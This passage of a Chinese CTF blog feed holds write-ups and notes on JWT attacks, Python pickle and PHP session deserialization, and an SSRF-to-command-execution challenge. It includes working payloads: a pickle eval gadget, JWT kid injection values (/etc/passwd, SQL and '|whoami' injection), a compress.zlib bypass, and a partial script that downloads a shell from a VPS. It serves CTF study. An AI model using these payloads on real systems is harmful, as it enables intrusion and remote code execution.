会自动转码为字符串</p><p>得到的结果是181</p><p><img src= "/img/loading.gif" data-src="/posts/2d71dd35/1583819267198.png" alt></p><p>当然按照管理你是买不起的</p><p>抓个包改一下折扣</p><p><img src= "/img/loading.gif" data-src="/posts/2d71dd35/1583819306763.png" alt></p><p>进入后台 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn&#x2F;b1g_m4mber</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/2d71dd35/1583819326133.png" alt></p><p>注意到是用jwt认证的，爆破一下</p><p><img src= "/img/loading.gif" data-src="/posts/2d71dd35/1583819359124.png" alt></p><p>然后伪造一下进入admin，查看页面源代码有代码下载地址</p><p>审计代码</p><p>看到 <code>Admin.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>会反序列化传过来的 become 参数，于是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p>生成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p>提交即可</p><p><img src= "/img/loading.gif" data-src="/posts/2d71dd35/1583819516737.png" alt></p><h2 id="抗疫分享赛webtmp"><a href="#抗疫分享赛webtmp" class="headerlink" title="抗疫分享赛webtmp"></a>抗疫分享赛webtmp</h2><p>这题涉及到了如何手动构造 pickle 数据</p><p>复习一下指令</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的网站</title>
      <link href="/posts/f364e7d6/"/>
      <url>/posts/f364e7d6/</url>
      
        <content type="html"><![CDATA[<h2 id="大师傅"><a href="#大师傅" class="headerlink" title="大师傅"></a>大师傅</h2><p><a href="http://szfszf.top/" target="_blank" rel="noopener">http://szfszf.top/</a></p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>bypass disabled function </p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tornado框架</title>
      <link href="/posts/11fc1d3/"/>
      <url>/posts/11fc1d3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jwt学习笔记</title>
      <link href="/posts/70fc8f0c/"/>
      <url>/posts/70fc8f0c/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p><p>jwt由三个部分组成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header.payload.signature</span><br></pre></td></tr></table></figure><p>首先看 <code>header</code></p><p><code>alg</code> 指定了token加密使用的算法（最常用的为<strong>HMAC</strong>和<strong>RSA</strong>算法</p><p>HMAC：对称</p><p>RSA：非对称</p><blockquote><p>HASH: 压缩</p><p>MAC: 带密钥的hash</p><p>HMAC: MAC的一种</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">        &quot;typ&quot; : &quot;jwt&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload</code></p><p>相关的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;user_role&quot; : &quot;finn&quot;,    &#x2F;&#x2F;当前登录用户</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,          &#x2F;&#x2F;该JWT的签发者</span><br><span class="line">    &quot;iat&quot;: 1573440582,        &#x2F;&#x2F;签发时间</span><br><span class="line">    &quot;exp&quot;: 1573940267,        &#x2F;&#x2F;过期时间</span><br><span class="line">    &quot;nbf&quot;: 1573440582,         &#x2F;&#x2F;该时间之前不接收处理该Token</span><br><span class="line">    &quot;domain&quot;: &quot;example.com&quot;,   &#x2F;&#x2F;面向的用户</span><br><span class="line">    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   &#x2F;&#x2F;Token唯一标识</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>signature</code> ,保护token完整性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signature &#x3D; HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</span><br></pre></td></tr></table></figure><h2 id="pyjwt"><a href="#pyjwt" class="headerlink" title="pyjwt"></a>pyjwt</h2><p>（注意是必须 pip install pyjwt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [1]: import jwt</span><br><span class="line"></span><br><span class="line">In [2]: encoded_jwt &#x3D; jwt.encode(&#123;&#39;user_name&#39;: &#39;admin&#39;&#125;, &#39;key&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line"></span><br><span class="line">In [3]: encoded_jwt</span><br><span class="line">Out[3]: b&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.fN_uBYJZuGWi_XnqKe_HDo6EYBU8Te1nanJRBnpnPns&#39;</span><br></pre></td></tr></table></figure><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 解密</p><p>可以看到并不需要key也可以直接解密，有点像flask 的session</p><p><img src= "/img/loading.gif" data-src="/posts/70fc8f0c/1584601836858.png" alt></p><p>解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [4]: print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms&#x3D;[&#39;HS256&#39;]))</span><br><span class="line">&#123;&#39;user_name&#39;: &#39;admin&#39;&#125;</span><br></pre></td></tr></table></figure><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h3><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p><p>pyjwt生成空加密算法的jwt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: encoded_jwt = jwt.encode(&#123;<span class="string">'user_name'</span>: <span class="string">'admin'</span>&#125;, <span class="string">'key'</span>, headers=&#123;<span class="string">"alg"</span>:<span class="string">"None"</span>, <span class="string">"typ"</span>:<span class="string">"jwt"</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: encoded_jwt</span><br><span class="line">Out[<span class="number">11</span>]: <span class="string">b'eyJ0eXAiOiJqd3QiLCJhbGciOiJOb25lIn0.eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.73u0KBesnvDB-k3jhmyzzPnExs8gUsxaYG2MBtBeNtg'</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70fc8f0c/1584602118605.png" alt></p><h3 id="修改加密算法RSA为HMAC-未尝试"><a href="#修改加密算法RSA为HMAC-未尝试" class="headerlink" title="修改加密算法RSA为HMAC(未尝试)"></a>修改加密算法RSA为HMAC(未尝试)</h3><p>理论：</p><p>一个Web应用，在JWT传输过程中使用RSA算法，密钥<code>pem</code>对JWT token进行签名，公钥<code>pub</code>对签名进行验证。</p><p>通常情况下密钥<code>pem</code>是无法获取到的，但是公钥<code>pub</code>却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时使用公钥pub作为密钥，这样服务端接收到的数据就会用HMAC的方式来验证了</p><h3 id="爆破密钥"><a href="#爆破密钥" class="headerlink" title="爆破密钥"></a>爆破密钥</h3><p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>了解一下</p><h3 id="修改kid参数"><a href="#修改kid参数" class="headerlink" title="修改kid参数"></a>修改kid参数</h3><p>用来指定私钥位置，也可以修改？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;&#x2F;home&#x2F;jwt&#x2F;.ssh&#x2F;pem&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="任意文件读取？-有点骚"><a href="#任意文件读取？-有点骚" class="headerlink" title="任意文件读取？(有点骚)"></a>任意文件读取？(有点骚)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;key11111111&#39; || union select &#39;secretkey&#39; -- &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#x2F;path&#x2F;to&#x2F;key_file|whoami&quot;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6776#toc-4" target="_blank" rel="noopener">jwt安全问题</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>requests文档阅读笔记</title>
      <link href="/posts/bce54486/"/>
      <url>/posts/bce54486/</url>
      
        <content type="html"><![CDATA[<h2 id="如何发送post请求"><a href="#如何发送post请求" class="headerlink" title="如何发送post请求"></a>如何发送post请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;, data &#x3D; &#123;&#39;key&#39;:&#39;value&#39;&#125;)</span><br></pre></td></tr></table></figure><p>其他的请求也类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r &#x3D; requests.put(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;put&#39;, data &#x3D; &#123;&#39;key&#39;:&#39;value&#39;&#125;)</span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.delete(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;delete&#39;)</span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.head(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;)</span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.options(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;)</span><br></pre></td></tr></table></figure><h2 id="GET请求如何传递URL参数"><a href="#GET请求如何传递URL参数" class="headerlink" title="GET请求如何传递URL参数"></a>GET请求如何传递URL参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [12]: r &#x3D; requests.get(url,params&#x3D;&#123;&quot;key1&quot;:&quot;1&quot;, &quot;key2&quot;:&quot;2&quot;&#125;)</span><br><span class="line"></span><br><span class="line">In [13]: r.url</span><br><span class="line">Out[13]: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key2&#x3D;2&amp;key1&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p>但是怎么传递数组呢？这是个问题</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>战疫分享赛wp</title>
      <link href="/posts/2f3193b1/"/>
      <url>/posts/2f3193b1/</url>
      
        <content type="html"><![CDATA[<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p><a href="http://www.zip源码，审计之后看到两个很有意思的操作" target="_blank" rel="noopener">www.zip源码，审计之后看到两个很有意思的操作</a></p><p>根目录下的 <code>init.php</code>文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//初始化整个页面</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//lib.php包括一些常见的函数</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure><p>但是在 <code>core</code> 目录下的 <code>init.php</code> 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//初始化整个页面</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="comment">//lib.php包括一些常见的函数</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../lib.php'</span>;</span><br><span class="line">session_save_path(<span class="string">'../session'</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure><p>用了两种不同的session处理方式</p><p>所以提交一个签名为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:4:&quot;info&quot;:1:&#123;s:5:&quot;admin&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><p>这样再访问 <code>profile.php</code> 的时候</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span><br><span class="line">            redirect(<span class="string">'./core/index.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就会触发反序列化，然后进入 <code>core/index.php</code> 中</p><p><code>core/index.php</code> 的源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once(&#39;.&#x2F;init.php&#39;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (check_session($_SESSION)) &#123;</span><br><span class="line">    #hint : core&#x2F;clear.php</span><br><span class="line">    $sandbox &#x3D; &#39;.&#x2F;sandbox&#x2F;&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    echo $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_POST[&#39;url&#39;])) &#123;</span><br><span class="line">        $url &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">        if (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            if (preg_match(&#39;&#x2F;(data:\&#x2F;\&#x2F;)|(&amp;)|(\|)|(\.\&#x2F;)&#x2F;i&#39;, $url)) &#123;</span><br><span class="line">                echo &quot;you are hacker&quot;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $res &#x3D; parse_url($url);</span><br><span class="line">                if (preg_match(&#39;&#x2F;127\.0\.0\.1$&#x2F;&#39;, $res[&#39;host&#39;])) &#123;</span><br><span class="line">                    $code &#x3D; file_get_contents($url);</span><br><span class="line">                    if (strlen($code) &lt;&#x3D; 4) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        echo &quot;try again&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;invalid url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&#39;只有管理员才能看到我哟&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不准用 <code>data</code> 协议，并且解析到的host必须是 <code>127.0.0.1</code> 初看还挺像2019年的byteCTF，但是这里用到的是 <code>compress.zlib</code> 协议(学习了)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;data:@127.0.0.1&#x2F;baidu.com?,ls</span><br></pre></td></tr></table></figure><p>当然也可以用base64的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;data:@127.0.0.1&#x2F;plain;base64,</span><br></pre></td></tr></table></figure><p>之后需要绕过长度来执行命令，脚本就用队友的好了，不能弹shell，只能从vps上下载shell到靶机上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">s = session()</span><br><span class="line">url = <span class="string">"http://121.36.222.22:88/login.php"</span></span><br><span class="line">s.post(url, data=&#123;<span class="string">'name'</span>:<span class="string">'pxypxy'</span>&#125;)</span><br><span class="line">url1 = <span class="string">"http://121.36.222.22:88/?page=upload"</span></span><br><span class="line">s.post(url1, data=&#123;<span class="string">'sign'</span>:<span class="string">'woc|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:4:"ssss";&#125;'</span>&#125;)</span><br><span class="line">url3 = <span class="string">"http://121.36.222.22:88/core/index.php"</span></span><br><span class="line">s.get(url3)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'x.x.x.x'</span></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))<span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>)])</span><br><span class="line">pos0 = <span class="string">'y'</span></span><br><span class="line">pos1 = <span class="string">'d'</span></span><br><span class="line">pos2 = <span class="string">'s'</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;%s\&gt;'</span> % pos0,</span><br><span class="line">    <span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line">    <span class="string">'&gt;p'</span>,</span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line">    <span 